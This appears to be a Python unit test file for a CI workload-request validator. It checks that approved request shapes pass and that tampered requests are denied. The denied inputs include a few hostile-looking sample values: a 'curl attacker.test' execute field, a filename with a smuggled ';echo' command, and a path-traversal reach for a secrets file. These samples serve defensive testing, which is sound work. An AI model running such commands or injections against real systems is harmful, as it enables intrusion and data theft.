"""CPU public-safe typed request acceptance and adversarial negative controls."""
import importlib.util
import json
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "scripts" / "gha_workload_request.py"
spec = importlib.util.spec_from_file_location("gha_workload_request", SRC)
m = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = m
spec.loader.exec_module(m)
X64 = "requests/gha/cpu-x64-arithmetic-v1.json"
ARM = "requests/gha/cpu-arm64-contract-v1.json"


class TypedWorkRequestTests(unittest.TestCase):
    def test_existing_two_shapes_are_admitted(self):
        first, second = m.plan(X64), m.plan(ARM)
        self.assertEqual(first["runner"], "ubuntu-24.04")
        self.assertEqual(second["runner"], "ubuntu-24.04-arm")
        self.assertEqual(first["max_cost_usd"], second["max_cost_usd"])
        self.assertEqual(first["max_cost_usd"], 0)
        self.assertEqual(first["max_attempts"], 1)
        self.assertEqual(first, m.plan(X64))
        self.assertEqual(len(first["request_sha256"]), 64)

    def test_no_unreviewed_paths_or_urls(self):
        for bad in ("../secrets.env", "requests/gha/../private.json",
                    "/tmp/public.json", "http://example.test/run.json",
                    "requests/gha/test.yml", "requests/gha/n.json",
                    "requests/gha/a;echo-b.json"):
            with self.subTest(path=bad), self.assertRaises(m.Denied):
                m.plan(bad)

    def test_request_mutations_denied(self):
        source, _ = m.read_request(X64)
        examples = [
            {"runner":"windows-11-arm"},
            {"runner":[]},
            {"workload":"run-shell"},
            {"workload":{}},
            {"execute":"curl attacker.test"},
            {"max_cost_usd":1},
            {"max_attempts":2},
            {"max_attempts":True},
            {"timeout_seconds":241},
            {"timeout_seconds":True},
            {"data_class":"private-holdout"},
            {"assignment_id":"../private"},
            {"schema":"unknown/v0"},
        ]
        for mutation in examples:
            with self.subTest(value=mutation), tempfile.TemporaryDirectory() as td:
                root = Path(td)
                dest = root/"requests"/"gha"
                dest.mkdir(parents=True)
                data=dict(source)
                data.update(mutation)
                (dest/"cpu-test.json").write_text(json.dumps(data),encoding="utf-8")
                with patch.object(m,"ROOT",root), patch.object(m,"REQUEST_DIR",dest):
                    with self.assertRaises(m.Denied):
                        m.plan("requests/gha/cpu-test.json")

    def test_digest_bind_rejects_drift(self):
        result = m.plan(X64)
        with self.assertRaisesRegex(m.Denied,"REQUEST_DIGEST_CHANGED"):
            m.run(X64, "0"*64)
        with self.assertRaisesRegex(m.Denied,"REQUEST_DIGEST_CHANGED"):
            m.run(X64, "hello")
        self.assertEqual(result["request_sha256"], m.plan(X64)["request_sha256"])

    def test_shape_absence_is_not_capability_pass(self):
        first=m.plan(X64)
        with patch.object(m.platform,"system",return_value="Linux"), \
             patch.object(m.platform,"machine",return_value="x86_64"), \
             patch.dict(m.os.environ,{"RUNNER_ARCH":"ARM64"}):
            receipt=m.run(X64, first["request_sha256"])
        self.assertFalse(receipt["qualified"])
        self.assertEqual(receipt["result"]["classification"],"FAIL_RUNNER_SHAPE")
        self.assertFalse(receipt["shape_verified"])

    def test_arithmetic_oracle_matched(self):
        d=m._execute("arithmetic-oracle",30)
        self.assertTrue(d["oracle_verified"])
        self.assertEqual(d["classification"],"PASS")
        self.assertEqual(d["task_count"],256)
        self.assertEqual(len(d["fixture_sha256"]),64)

    def test_non_shell_backend(self):
        source=SRC.read_text()
        self.assertNotIn("shell=True",source)
        self.assertNotIn("eval(",source)
        self.assertNotIn("exec(",source)
        self.assertIn('"arithmetic-oracle"',source)
        self.assertIn('"sealed-contract-native"',source)

    def test_symlink_source_is_not_admitted(self):
        source, _ = m.read_request(X64)
        with tempfile.TemporaryDirectory() as td:
            root=Path(td)
            dest=root/"requests"/"gha"
            dest.mkdir(parents=True)
            outside=root/"unreviewed.json"
            outside.write_text(json.dumps(source))
            (dest/"cpu-test.json").symlink_to(outside)
            with patch.object(m,"ROOT",root), patch.object(m,"REQUEST_DIR",dest):
                with self.assertRaisesRegex(m.Denied,"REQUEST_NOT_REVIEWED_LOCAL_FILE"):
                    m.plan("requests/gha/cpu-test.json")


if __name__=="__main__":
    unittest.main()
